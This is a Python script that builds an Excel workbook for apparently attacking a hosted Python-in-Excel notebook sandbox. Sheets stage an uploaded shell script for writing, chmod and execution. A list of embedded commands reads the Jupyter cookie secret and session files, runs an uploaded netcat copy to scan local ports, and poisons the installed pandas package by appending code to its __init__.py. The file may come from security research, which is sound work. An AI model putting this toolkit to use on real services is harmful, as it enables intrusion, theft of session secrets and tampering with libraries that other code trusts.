from openpyxl import Workbook
from openpyxl.workbook.defined_name import DefinedName
from openpyxl.styles import Font, PatternFill, Border, Side, Alignment
import re
import os, stat

TARGET_EXECUTABLE_NAME = "myshell.sh"
SOURCE_UPLOADS_DIRECTORY = "./uploads"
SOURCE_EXECUTABLE_LOCATION = "myshell.sh"
EXCEL_NAME_TO_CREATE = "excel-py-template.xlsx"

INTERESTING_COMMANDS = """
# Interesting directories
ls -al /home/jovyan/
ls -al /
ls -al /home/jovyan/.local/share/jupyter/runtime/
ls -al /mnt/data_upload
ls -al /mnt/file_upload
python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))"
ls -al  /app/officepy/lib/python3.12/site-packages/pandas

# create file
echo Hello world > /home/jovyan/helloworld.txt
cat /home/jovyan/helloworld.txt
echo echo Hello world, too > /home/jovyan/helloworld.sh
chmod +x /home/jovyan/helloworld.sh
/home/jovyan/helloworld.sh

#### interesting files
cat /etc/hosts
cat /home/jovyan/.local/share/jupyter/runtime/jupyter_cookie_secret
# list all session files 
find /home/jovyan/.local/share/jupyter/runtime  -maxdepth 1 -type f -name "*.json" -exec echo -e "\nFile: {}" \; -exec cat {} \; -exec echo -e "\n" \; 
# look for jupyter notebooks
find "/" -type f -name "*.ipynb"  2>/dev/null
# find the python entry point (argv[0] from the environment)
find "/" -type f -name "03d0ddc3-36d1-4e9c-adc5-4e890a37ccf1.py"
# cat  /app/officepy/lib/python3.12/site-packages/pandas/__init__.py
cat $(python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))")/__init__.py




# attempted execution - should work
jupyter notebook list
jupyter server  list
pip -h
rpm --help

# attempted execution
lsof -i TCP:8080
pydata --help
wget --help
which ldd
curl --version
ifconfig -a
nc -h
nmap --help

# execution from uploaded files
/home/jovyan/cn -h
# scan open local ports
/home/jovyan/cn -zv localhost 1000-9999  2>&1 | grep succeeded
/home/jovyan/ifconfig -a

# poisoned pandas
PANDAS_DIR
# ls -al /app/officepy/lib/python3.12/site-packages/pandas

# echo "" >>  /app/officepy/lib/python3.12/site-packages/pandas/__init__.py
# echo "fubar = 42" >>  /app/officepy/lib/python3.12/site-packages/pandas/__init__.py
# echo "__all__ += ['fubar']" >>  /app/officepy/lib/python3.12/site-packages/pandas/__init__.py

echo "" >> $(python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))")/__init__.py
echo "fubar = 42" >> $(python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))")/__init__.py
echo "__all__  += ['fubar']" >> $(python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))")/__init__.py
echo "__fubar__ = 42" >> $(python -c "import os; import pandas; print(os.path.dirname(pandas.__file__))")/__init__.py
"""

def get_file_from_storage(filename: str) -> str:
    with open(filename, "r") as f:
        return f.read()

def list_directory_contents(directory: str) -> list:
    def get_item_type(st_mode):
        """Determine if the item is a file, directory, or symbolic link (junction)."""
        if stat.S_ISDIR(st_mode):
            return "directory"
        elif stat.S_ISREG(st_mode):
            return "file"
        elif stat.S_ISLNK(st_mode):
            return "symbolic"
        else:
            return "other"
    try:
        # Check if the provided path is a valid directory
        if os.path.isdir(directory):
            contents_of_directory = []
            for item in os.listdir(directory):
                item_path = os.path.join(directory, item)
                stat_info = os.stat(item_path)
                item_type = get_item_type(stat_info.st_mode)
                # Create a tuple with the item's information
                if item_type == "file":
                    contents_of_directory.append(item)
            contents_of_directory = sorted(contents_of_directory)
            # sort_tuples_by_index_item(contents_for_excel)
            return contents_of_directory
        else:
            print(f"Error: '{directory}' is not a valid directory.")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None


# The function accepts an excel cell reference and returns a tuple with the column and row.
# Both relative and absolute references are supported.
def split_excel_reference(reference: str) -> tuple[str, int]:
    match = re.match(r"\$?([A-Za-z]+)\$?([0-9]+)", reference)
    if match:
        column, row = match.groups()
        return column, int(row)
    else:
        raise ValueError("Invalid cell reference format")

# The function accepts an excel cell reference and converts it into a relative or absolute reference.
def convert_cell_reference_to_absolute(reference: str, absolute_row=True, absolute_column=True) -> str:
    reference_range = reference.split(":")
    result = []
    for ref in reference_range:
        column, row = split_excel_reference(ref)
        result.append(f"{'$' if absolute_column else ''}{column}{'$' if absolute_row else ''}{row}")
    return ":".join(result)

# The function accepts a string with a delimiter, and converts it into a list of dictionaries to be inserted into excel
# the usage is to embed long scripts or BASE64 texts
def convert_string_to_excel_cells(string_to_convert: str,
                                  starting_cell="A2",
                                  direction="vertical",
                                  ignore_empty_lines=True,
                                  delimiter = "\n"
                                  ) -> list:
    starting_column, starting_row = split_excel_reference(starting_cell)
    string_to_list = string_to_convert.split(delimiter)
    # ignore empty lines at the beginning and end of the list, typically when we use """ delimited strings
    if ignore_empty_lines and string_to_list[-1] == "":
        string_to_list = string_to_list[:-1]
    if ignore_empty_lines and string_to_list[0] == "":
        string_to_list = string_to_list[1:]
    cells = []
    for i, line in enumerate(string_to_list):
        if direction == "vertical":
            cell = {
                "reference": f"{starting_column}{starting_row+i}",
                "value": line,
            }
            cells.append(cell)
        elif direction == "horizontal":
            # TODO: Implement horizontal direction
            cell = {
                "reference": f"{starting_column}{starting_row + i}",
                "value": line,
            }
            cells.append(cell)
    return cells

# The function accepts a filename and a list of dictionaries with the sheet name and the cells to insert
def create_excel_workbook(filename="example.xlsx", spreadsheet_dict=[]):
    # Create a new workbook
    workbook = Workbook()
    for sheet_range in spreadsheet_dict:
        sheet_name = sheet_range["sheet"]
        sheet = workbook.create_sheet(title=sheet_name)
        for cell in sheet_range.get("cells", []):
            cell_ref = cell["reference"]
            sheet[cell_ref] = cell["value"]
            if "font" in cell:
                sheet[cell_ref].font = Font(**cell["font"])
            if "name" in cell:
                named_range = DefinedName(cell["name"], attr_text=f"{sheet_name}!{ convert_cell_reference_to_absolute(cell_ref) }")
                workbook.defined_names.add(named_range)
        if "extra_names" in sheet_range:
            for extra_name in sheet_range["extra_names"]:
                named_range = DefinedName(extra_name["name"], attr_text=f"{sheet_name}!{convert_cell_reference_to_absolute(extra_name['value'])}")
                workbook.defined_names.add(named_range)

    # Remove the default sheet created by openpyxl
    default_sheet = workbook.active
    workbook.remove(default_sheet)
    workbook.save(filename)

# Run the function
if __name__ == "__main__":
    starting_row_for_data = 4
    executable_text_range_start = f"A{starting_row_for_data}"
    template_executable_script = get_file_from_storage(f"{SOURCE_UPLOADS_DIRECTORY}/{SOURCE_EXECUTABLE_LOCATION}")
    template_executable_script_as_excel = convert_string_to_excel_cells(template_executable_script, starting_cell=executable_text_range_start)
    template_executable_script_num_of_lines = len(template_executable_script_as_excel)
    template_interesting_commands = convert_string_to_excel_cells(INTERESTING_COMMANDS, starting_cell="A5")
    template_executable_script_as_excel.append({"reference": "A3", "value": "Content to upload", "font": {"bold" : True}})
    template_executable_script_as_excel.append({"reference": "A1", "value": "=DATAPATH"})
    executable_text_range_end = f"A{starting_row_for_data + template_executable_script_num_of_lines - 1}"
    sheets_and_ranges = [
        {
            "sheet": "ENVIRONMENT",
        },
        {
            "sheet": "EXECUTE",
            "cells": [
                {"reference": "A1", "value": "COMMAND_TO_RUN", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A2", "value": "=A6", "name": "COMMAND_TO_RUN"},
                {"reference": "A4", "value": "Interesting Commands to use", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "B1", "value": "Execution Results (place python code into a PY function in cell B2)", },
            ] + template_interesting_commands,
        },
        {
            "sheet": "UPLOAD",
            "cells": [
                {"reference": "A1", "value": "UPLOADED_FILE_NAME", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A2", "value": SOURCE_EXECUTABLE_LOCATION, "name": "UPLOADED_FILE_NAME"},
                {"reference": "A4", "value": "UPLOAD_DATA_SOURCE", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A5", "value": "=A20", "name": "UPLOAD_DATA_SOURCE"},
                {"reference": "A7", "value": "CHMOD_EXECUTE", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A8", "value": True, "name": "CHMOD_EXECUTE"},
                {"reference": "A10", "value": "CONVERT_FROM_BASE64", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A11", "value": False, "name": "CONVERT_FROM_BASE64"},
                {"reference": "A13", "value": "Execute_Command_on_Upload", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A14", "value": f'/home/jovyan/{TARGET_EXECUTABLE_NAME}', "name": "Execute_Command_on_Upload"},
                {"reference": "A16", "value": "Full Upload Path", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A17", "value": '\'=TEXTBEFORE(CELL("filename"),"\\",-1) & "\\uploads\\" & UPLOAD_DATA_SOURCE', "name": "DATAPATH"},
                {"reference": "A19", "value": "Contents of uploads folder", "font": {"bold" : True, "underline" : "single"}},
                {"reference": "A20", "value": TARGET_EXECUTABLE_NAME},
                {"reference": "A21", "value": 'which.base64.txt'},
                {"reference": "B1", "value": "Upload results (place python code into a PY function in cell B2)"},
            ],
        },
        {
            "sheet": "DATA",
            "cells": template_executable_script_as_excel,
            "extra_names": [
                {"name": "Base64_data", "value": f"{executable_text_range_start}:{executable_text_range_end}"},
            ]

        },
    ]

    create_excel_workbook(filename=EXCEL_NAME_TO_CREATE, spreadsheet_dict=sheets_and_ranges)
